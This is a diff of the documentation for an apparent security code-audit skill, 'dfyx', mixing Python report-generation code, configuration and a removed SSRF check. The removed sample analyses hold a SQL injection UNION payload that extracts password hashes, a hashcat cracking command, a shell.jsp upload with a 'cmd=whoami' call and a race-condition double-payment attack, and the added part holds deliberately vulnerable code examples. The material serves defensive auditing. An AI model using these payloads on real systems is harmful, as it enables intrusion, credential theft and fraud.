-        if (!['http:', 'https:'].includes(url.protocol)) {
-            return false;
-        }
+        sections = ["## Hardcoded Secrets\n"]
         
-        // Whitelist domains
-        if (!ALLOWED_HOSTS.includes(url.hostname)) {
-            return false;
-        }
+        for secret in self.secrets:
+            sections.append(f"""- **{secret['type']}** in `{secret['file']}:{secret['line']}`
+  - Severity: {secret['severity'].upper()}
+  - Preview: `{secret['matched']}`
+""")
         
-        // Resolve and check IP (prevent DNS rebinding)
-        const dns = require('dns').promises;
-        const addresses = await dns.resolve4(url.hostname);
-        
-        for (const ip of addresses) {
-            if (BLOCKED_IPS.some(blocked => 
-                typeof blocked === 'string' ? ip === blocked : blocked.test(ip)
-            )) {
-                return false;
-            }
-        }
-        
-        return true;
-    } catch {
-        return false;
-    }
-}
-
-app.get('/api/fetch', async (req, res) => {
-    const url = req.query.url;
+        return '\n'.join(sections)
     
-    if (!await isAllowedURL(url)) {
-        return res.status(400).json({ error: 'Invalid or disallowed URL' });
-    }
+    def _count_by_severity(self) -> Dict[str, int]:
+        """Count findings by severity"""
+        counts = {}
+        
+        for vuln in self.vulnerabilities:
+            severity = vuln.get('severity', 'medium')
+            counts[severity] = counts.get(severity, 0) + 1
+        
+        for secret in self.secrets:
+            severity = secret.get('severity', 'medium')
+            counts[severity] = counts.get(severity, 0) + 1
+        
+        return counts
     
-    try {
-        const response = await axios.get(url, {
-            timeout: 5000,
-            maxRedirects: 0  // Prevent redirect-based bypasses
-        });
-        res.json(response.data);
-    } catch (error) {
-        res.status(500).json({ error: 'Fetch failed' });
-    }
-});
+    def _top_risks(self) -> str:
+        """Identify top risks"""
+        critical_vulns = [v for v in self.vulnerabilities 
+                         if v.get('severity') == 'critical']
+        
+        if not critical_vulns:
+            return "No critical risks identified."
+        
+        risks = []
+        for vuln in critical_vulns[:3]:
+            risks.append(f"- **{vuln['type']}** in `{vuln['file']}`")
+        
+        return '\n'.join(risks)
+    
+    def _format_data_flow(self, flows: List[Dict]) -> str:
+        """Format data flow for display"""
+        if not flows:
+            return "*Data flow analysis not available*"
+        
+        lines = []
+        for flow in flows:
+            lines.append(f"- Line {flow['line']}: {flow['type']} - `{flow.get('var', 'N/A')}`")
+        
+        return '\n'.join(lines)
+    
+    def _describe_impact(self, vuln_type: str) -> str:
+        """Describe vulnerability impact"""
+        impacts = {
+            'sql_injection': 'Attacker can read/modify database, potentially gain full system access',
+            'command_injection': 'Attacker can execute arbitrary commands on the server',
+            'deserialization': 'Attacker can execute arbitrary code through malicious serialized objects',
+            'path_traversal': 'Attacker can read arbitrary files on the system',
+            'ssrf': 'Attacker can make requests to internal services'
+        }
+        return impacts.get(vuln_type, 'Potential security compromise')
+    
+    def _remediation_advice(self, vuln_type: str) -> str:
+        """Provide remediation advice"""
+        advice = {
+            'sql_injection': '''1. Use parameterized queries/prepared statements
+2. Implement input validation with whitelisting
+3. Use ORM frameworks with proper escaping
+4. Apply principle of least privilege to database accounts''',
+            
+            'command_injection': '''1. Avoid executing system commands from user input
+2. Use language-specific safe APIs instead of shell commands
+3. Implement strict input validation with whitelisting
+4. Apply sandboxing or containerization''',
+            
+            'deserialization': '''1. Never deserialize untrusted data
+2. Implement integrity checks (HMAC) on serialized data
+3. Use safe serialization formats (JSON instead of pickle)
+4. Implement type checking before deserialization'''
+        }
+        return advice.get(vuln_type, 'Implement appropriate security controls')
+    
+    def _remediation_priorities(self) -> str:
+        """Suggest remediation priorities"""
+        return """## Remediation Priority
+
+### Immediate (Within 24 hours)
+- Fix all CRITICAL severity vulnerabilities
+- Remove hardcoded secrets, rotate credentials
+
+### Short-term (Within 1 week)
+- Fix all HIGH severity vulnerabilities
+- Implement missing security controls
+
+### Medium-term (Within 1 month)
+- Fix MEDIUM severity vulnerabilities
+- Improve security testing coverage
+"""
+    
+    def _appendix(self) -> str:
+        return """## Appendix
+
+### Audit Methodology
+
+This audit used the dfyx five-phase protocol:
+1. **Reconnaissance**: Architecture and attack surface analysis
+2. **Pattern Matching**: Dangerous code pattern identification
+3. **Taint Tracking**: Data flow analysis from source to sink
+4. **Validation**: Vulnerability confirmation and exploitability assessment
+5. **Reporting**: Structured documentation with remediation guidance
+
+### References
+- OWASP Top 10: https://owasp.org/www-project-top-ten/
+- CWE Top 25: https://cwe.mitre.org/top25/
+"""
 ```
 
 ## Configuration
 
 ### Audit Mode Selection
 
+Control audit depth through mode parameter:
+
 ```python
-# scripts/code_scan.py --mode [quick|standard|deep]
+# Quick scan - CI/CD integration
+scan_project('/path/to/project', mode='quick')
 
-# Quick mode (CI/CD)
-python scripts/code_scan.py --mode quick /path/to/project
+# Standard scan - regular audits
+scan_project('/path/to/project', mode='standard')
 
-# Standard mode (default)
-python scripts/code_scan.py --mode standard /path/to/project
-
-# Deep mode (comprehensive)
-python scripts/code_scan.py --mode deep /path/to/project
+# Deep scan - comprehensive audit
+scan_project('/path/to/project', mode='deep')
 ```
 
-### Custom Rule Configuration
+### Environment Variables
 
-Create `custom_rules.yaml`:
-
-```yaml
-# resources/rules/custom_rules.yaml
-rules:
-  - id: CUSTOM-001
-    name: "Internal API Key Exposure"
-    severity: CRITICAL
-    pattern: "INTERNAL_API_KEY\\s*=\\s*['\"][a-zA-Z0-9]{32,}['\"]"
-    languages: [python, javascript, java]
-    description: "Hardcoded internal API keys detected"
-    
-  - id: CUSTOM-002
-    name: "Unsafe Pickle Usage"
-    severity: HIGH
-    pattern: "pickle\\.loads?\\("
-    languages: [python]
-    description: "Unsafe deserialization via pickle"
-    validation:
-      - check_source_taint: true
-      - require_user_input: true
-```
-
-Load custom rules:
+Use environment variables for sensitive configuration:
 
 ```bash
-python scripts/code_scan.py --rules resources/rules/custom_rules.yaml /path/to/project
+# Set project path
+export AUDIT_PROJECT_PATH=/path/to/project
+
+# Set output directory
+export AUDIT_OUTPUT_DIR=./audit_reports
+
+# Set severity threshold (ignore findings below this level)
+export AUDIT_MIN_SEVERITY=medium
+
+# Enable verbose logging
+export AUDIT_VERBOSE=true
 ```
 
-### Report Configuration
+## Security Dimensions Reference
 
-```yaml
-# templates/report_config.yaml
-report:
-  format: markdown  # markdown | json | html
-  include_poc: true
-  include_code_snippets: true
-  max_snippet_lines: 20
-  severity_threshold: medium  # critical | high | medium | low
-  
-output:
-  directory: ./reports
-  filename_template: "security_audit_{project}_{date}.md"
-  
-compliance:
-  frameworks: [owasp-top-10, pci-dss, cwe-top-25]
-  include_mapping: true
+### D1: Injection Vulnerabilities
+
+**Detection patterns:**
+- SQL injection (query concatenation)
+- Command injection (shell execution)
+- LDAP injection
+- XML injection
+- Template injection (SSTI, SpEL, JNDI)
+
+**Example (Python):**
+```python
+# VULNERABLE
+query = f"SELECT * FROM users WHERE id = {user_id}"  # SQL injection
+os.system(f"ping {hostname}")  # Command injection
+
+# SECURE
+query = "SELECT * FROM users WHERE id = ?"
+cursor.execute(query, (user_id,))  # Parameterized query
+subprocess.run(['ping', hostname], shell=False)  # Safe execution
 ```
 
-## Helper Scripts
+### D2: Authentication Issues
 
-### Pattern Scanner
+**Detection patterns:**
+- Weak password policies
+- Missing password hashing
+- Insecure session management
+- JWT vulnerabilities
 
-```bash
-# Scan for specific vulnerability types
-python scripts/pattern_scanner.py \
-  --type sql_injection \
-  --language java \
-  /path/to/project
-```
+**Example (Java):**
+```java
+// VULNERABLE
+String password = request.getParameter("password");
+if (user.getPassword().equals(password)) { /* login */ }
 
-### Taint Analysis
-
-```bash
-# Deep taint tracking from user input to sink
-python scripts/data_flow_analyzer.py \
-  --entry-point "UserController.search" \
-  --sink "MyBatis.select" \
-  /path/to/project
-```
-
-### Secret Detection
-
-```bash
-# Find hardcoded secrets
-python scripts/secret_finder.py \
-  --output secrets_report.json \
-  /path/to/project
-```
-
-### Dependency Analysis
-
-```bash
-# Check for vulnerable dependencies
-python scripts/dependency_analyzer.py \
-  --check-cve \
-  --output deps_report.json \
-  /path/to/project
-```
-
-## Common Troubleshooting
-
-### False Positives
-
-**Issue:** Agent reports sanitized input as vulnerable
-
-**Solution:** Verify sanitization context:
-
-```
-User: "The input is validated by Spring's @Pattern annotation"
-
-Agent: Re-analyzing with annotation context...
-  - @Pattern(regexp="^[a-zA-Z0-9]+$") provides basic validation
-  - However, still vulnerable to SQL injection via LIKE wildcards
-  - Recommendation: Use parameterized queries (#{}) instead of ${}
-```
-
-### Missing Vulnerabilities
-
-**Issue:** Known vulnerability not detected in Quick mode
-
-**Solution:** Use Standard or Deep mode for comprehensive coverage:
-
-```bash
-# Quick mode focuses on high-confidence, high-severity issues
-python scripts/code_scan.py --mode quick /project  # Might miss edge cases
-
-# Deep mode enables full taint tracking and business logic analysis
-python scripts/code_scan.py --mode deep /project   # Catches complex chains
-```
-
-### Performance Issues
-
-**Issue:** Audit takes too long on large codebase
-
-**Solution:** Use targeted scans:
-
-```bash
-# Scan specific directories
-python scripts/code_scan.py --include "src/main/java/com/app/controllers" /project
-
-# Exclude test files
-python scripts/code_scan.py --exclude "*/test/*,*/tests/*" /project
-
-# Focus on specific dimensions
-python scripts/code_scan.py --dimensions D1,D2,D3 /project
-```
-
-### Language-Specific Issues
-
-**Issue:** Framework-specific patterns not recognized
-
-**Solution:** Update framework detection rules in `resources/knowledge/architecture_analysis.md`:
-
-```yaml
-frameworks:
-  spring_boot:
-    patterns:
-      - "org.springframework.boot.SpringApplication"
-      - "@SpringBootApplication"
-    entry_points:
-      - "@RestController"
-      - "@RequestMapping"
-    sinks:
-      sql_injection:
-        - "JdbcTemplate.query"
-        - "EntityManager.createNativeQuery"
-```
-
-## Advanced Patterns
-
-### Multi-Stage Attack Chain
-
-```
-User: "find attack chains that lead to RCE"
-
-Agent Analysis:
-[CHAIN-001] SQL Injection → Admin Account → File Upload RCE
-  Stage 1: SQL Injection in /api/users/search
-    - Bypass authentication filter
-    - Extract admin password hash from database
-    
-  Stage 2: Bruteforce or Rainbow Table
-    - Crack bcrypt hash (weak rounds=4)
-    - Gain admin credentials
-    
-  Stage 3: Authenticated File Upload
-    - POST /admin/upload with .jsp file
-    - No extension whitelist validation
-    - Files served from /uploads (executable context)
-    
-  Stage 4: Remote Code Execution
-    - Access uploaded shell.jsp
-    - Execute OS commands via Runtime.getRuntime().exec()
-  
-  Combined PoC:
-    1. GET /api/users/search?query=admin' UNION SELECT password FROM users--
-    2. Crack hash: hashcat -m 3200 hash.txt wordlist.txt
-    3. Login as admin
-    4. Upload shell.jsp
-    5. GET /uploads/shell.jsp?cmd=whoami
-```
-
-### Business Logic Vulnerability
-
-```
-User: "check for race conditions in payment processing"
-
-Agent Analysis:
-[D9-LOGIC-004] Race Condition in Order Payment
-  Location: OrderService.processPayment()
-  
-  Vulnerable Code:
-    public void processPayment(Long orderId, Long userId) {
-        Order order = orderRepo.findById(orderId);
-        if (order.getStatus() != PAID) {  // Check
-            // ... process payment ...
-            order.setStatus(PAID);          // Update (non-atomic)
-            orderRepo.save(order);
-        }
-    }
-  
-  Attack: Send concurrent requests
-    Thread 1: POST /api/orders/123/pay → Check passes → Delay
-    Thread 2: POST /api/orders/123/pay → Check passes → Payment processed
-    Thread 1: Resumes → Payment processed again (double charge)
-  
-  Remediation:
-    @Transactional(isolation = Isolation.SERIALIZABLE)
-    public void processPayment(Long orderId, Long userId) {
-        Order order = orderRepo.findByIdForUpdate(orderId);  // SELECT FOR UPDATE
-        if (order.getStatus() != PAID) {
-            // Atomic check-and-update within transaction
-            paymentGateway.charge(order.getAmount());
-            order.setStatus(PAID);
-            orderRepo.save(order);
-        }
-    }
-```
-
-## Knowledge Base
-
-The skill uses 13 specialized knowledge documents in `resources/knowledge/`:
-
-- `architecture_analysis.md` - Framework detection, entry point mapping
-- `pattern_scanning.md` - Vulnerability pattern database
-- `taint_analysis_enhanced.md` - Advanced data flow tracking
-- `vulnerability_validation.md` - PoC generation and verification
-- `attack_chain_analysis.md` - Multi-stage exploit construction
-- `secret_detection.md` - Credential and API key detection
-- `dependency_analysis.md` - CVE mapping for dependencies
-- `anti_hallucination.md` - Evidence-based validation mechanisms
-
-## Real-World Case Studies
-
-The skill includes 100+ real vulnerability cases from WooYun (2010-2016) in `resources/wooyun/wooyun_cases_by_vulnerability_type.md`:
-
-- SQL Injection (35 cases)
-- Authentication Bypass (12 cases)
-- File Upload RCE (18 cases)
-- SSRF (8 cases)
-- Deserialization (15 cases)
-- Business Logic (12 cases)
-
-Each case includes: vulnerable code, attack vector, PoC, and remediation.
-
-## Environment Variables
-
-```bash
-# Required for Docker-based validation
-export DOCKER_ENABLED=true
-
-# Optional: Custom tool paths
-export SEMGREP_PATH=/usr/local/bin/semgrep
-export BANDIT_PATH=/usr/local/bin/bandit
-
-# Report output
-export AUDIT_REPORT_DIR=./security_reports
-export AUDIT_REPORT_FORMAT=markdown  # markdown | json | html
-
-# API keys for dependency scanning (optional)
-export SNYK_API_KEY  # For Snyk integration
-export GITHUB_TOKEN  # For GitHub Advisory DB
-```
-
-## Integration with CI/CD
-
-### GitHub Actions
-
-```yaml
-# .github/workflows/security-audit.yml
-name: Security Code Audit
-
-on: [push, pull_request]
-
-jobs:
-  audit:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
-      
-      - name: Setup Python
-        uses: actions/setup-python@v4
-        with:
-          python-version: '3.9'
-      
-      - name: Install dfyx-audit
-        run: |
-          git clone https://github.com/EastSword/skill-dfyx_code_security_review.git
-          cd skill-dfyx_code_security_review
-          pip install -r requirements.txt
-      
-      - name: Run Security Audit
-        run: |
-          python scripts/code_scan.py \
-            --mode standard \
-            --output report.json \
-            --fail-on high \
-            .
-      
-      - name: Upload Report
-        uses: actions/upload-artifact@v3
-        if: always()
-        with:
-          name: security-audit-report
-          path: report.json
-```
-
-### GitLab CI
-
-```yaml
-# .gitlab-ci.yml
-security_audit:
-  stage: test
-  image: python:3.9
-  script:
-    - git clone https://github.com/EastSword/skill-dfyx_code_security_review.git
-    - cd skill-dfyx_code_security_review && pip install -r requirements.txt && cd ..
-    - python skill-dfyx_code_security_review/scripts/code_scan.py --mode quick --output audit.json .
-  artifacts:
-    reports:
-      security: audit.json
-    when: always
-```
-
-## Best Practices for AI Agents
-
-When using this skill, agents should:
-
-1. **Always verify file paths** before reporting vulnerabilities
-2. **Provide complete data flows** from source to sink
-3. **Include actual code snippets** (not descriptions)
-4. **Generate testable PoCs** when possible
-5. **Suggest multiple remediation options** (secure coding + framework-specific)
-6. **Cross-reference CWE/OWASP** classifications
-7. **Validate findings** through static analysis + dynamic testing
-
-## License
-
-MIT License - For educational and security research purposes only.
+// SECURE
+String password = request.getParameter("password");
